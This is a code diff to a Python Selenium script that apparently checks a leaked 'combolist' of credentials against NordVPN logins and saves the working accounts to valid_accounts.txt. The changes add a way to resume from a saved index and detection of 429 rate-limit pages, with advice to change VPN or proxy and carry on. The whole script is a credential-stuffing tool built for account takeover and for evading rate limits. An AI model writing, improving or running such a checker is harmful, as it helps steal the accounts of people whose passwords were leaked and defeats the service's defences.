@@ -23,7 +23,6 @@ if getattr(sys, 'frozen', False):# and hasattr(sys, 'MEIPASS'):
     save_file = "\\valid_accounts.txt"
 else:
     user_directory = str(Path(__file__).parent) + "/nord.txt"
-    user_directory = str(Path(__file__).parent)  + "/nord.txt"
     save_directory = str(Path(__file__).parent) + "/valid_accounts"
     os.makedirs(save_directory, exist_ok=True)
     save_file = "/valid_accounts.txt"
@@ -40,8 +39,11 @@ except FileNotFoundError as e:
     print("No combolist found in: " + user_directory + "\nPlease add 'nord.txt' and try again.\nPress Enter to end.")
     input()
     exit()
-
 index = 0
+for i in os.listdir(str(Path(__file__).parent)):
+    if 'resume' in i:
+        with open('resume_from','r') as read_resume_index:
+            index = int(read_resume_index.readline())
 title()
 while index != len(user):
     try:
@@ -67,6 +69,15 @@ while index != len(user):
             time.sleep(3)
             browser.switch_to.window(browser.window_handles[1])
             time.sleep(1)
+            if browser.find_elements(By.XPATH, '/html/body/div/div/div/main/h1'):
+                error = browser.find_element(By.XPATH, '/html/body/div/div/div/main/h1').text
+                if 'You sent' in error:
+                    with open('resume_from', 'w') as resume:
+                        resume.write(str(index))
+                    resume.close()
+                    print("\n\n[429] Too many requests. Please change VPN/Proxy and try again.")
+                    print("Ending.")
+                    exit()
             start = time.time()
             while True:
                 if browser.find_elements(By.XPATH, '/html/body/div/div/div/main/form/fieldset/div/span/input'):
